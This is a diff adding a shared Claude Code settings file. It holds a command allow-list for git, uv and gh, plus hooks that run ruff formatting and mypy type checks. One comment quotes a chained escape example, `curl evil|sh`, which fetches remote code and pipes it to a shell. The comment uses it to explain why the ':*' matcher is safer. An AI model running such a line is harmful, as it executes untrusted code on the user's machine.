@@ -1,0 +1,72 @@
+{
+  "//": "SHARED, committed Claude Code permissions + hooks. Safe, portable, reviewable. Use the ':*'",
+  "// ": "prefix matcher (e.g. \"git commit:*\"), NOT a bare-space glob (\"git commit *\"): ':*' respects",
+  "//  ": "command boundaries, so a chained escape like `git commit -m x && curl evil|sh` is NOT",
+  "//   ": "auto-approved. Machine-specific paths and higher-privilege conveniences belong in",
+  "//    ": "settings.local.json (git-ignored), NOT here.",
+  "permissions": {
+    "allow": [
+      "Bash(make:*)",
+
+      "Bash(uv run:*)",
+      "Bash(uv sync:*)",
+      "Bash(uv add:*)",
+
+      "Bash(git add:*)",
+      "Bash(git commit:*)",
+      "Bash(git checkout:*)",
+      "Bash(git branch:*)",
+      "Bash(git switch:*)",
+      "Bash(git stash:*)",
+      "Bash(git rebase:*)",
+      "Bash(git merge:*)",
+      "Bash(git fetch:*)",
+      "Bash(git pull:*)",
+      "Bash(git push:*)",
+      "Bash(git diff:*)",
+      "Bash(git log:*)",
+      "Bash(git status:*)",
+      "Bash(git ls-files:*)",
+      "Bash(git check-ignore:*)",
+
+      "Bash(gh pr:*)",
+      "Bash(gh run:*)",
+      "Bash(gh repo:*)",
+
+      "Bash(command -v:*)",
+
+      "WebSearch"
+    ]
+  },
+  "enabledPlugins": {
+    "superpowers@claude-plugins-official": true,
+    "commit-commands@claude-plugins-official": true
+  },
+  "hooks": {
+    "PostToolUse": [
+      {
+        "//": "Auto-format any Python file the moment Claude writes or edits it, so formatting never drifts.",
+        "matcher": "Write|Edit|MultiEdit",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "jq -r '.tool_input.file_path // empty' | { read -r f; case \"$f\" in *.py|*.pyi) uv run ruff format \"$f\";; esac; } >/dev/null 2>&1 || true",
+            "statusMessage": "Formatting with ruff..."
+          }
+        ]
+      }
+    ],
+    "Stop": [
+      {
+        "//": "Type-check src/ when Claude finishes a turn; surface any mypy errors back into the session.",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "o=$(uv run mypy src 2>&1); s=$?; [ $s -ne 0 ] && printf '%s' \"$o\" | jq -Rs '{systemMessage: (\"mypy type errors in src/:\\n\" + .)}'; true",
+            "statusMessage": "Type-checking src/ with mypy..."
+          }
+        ]
+      }
+    ]
+  }
+}
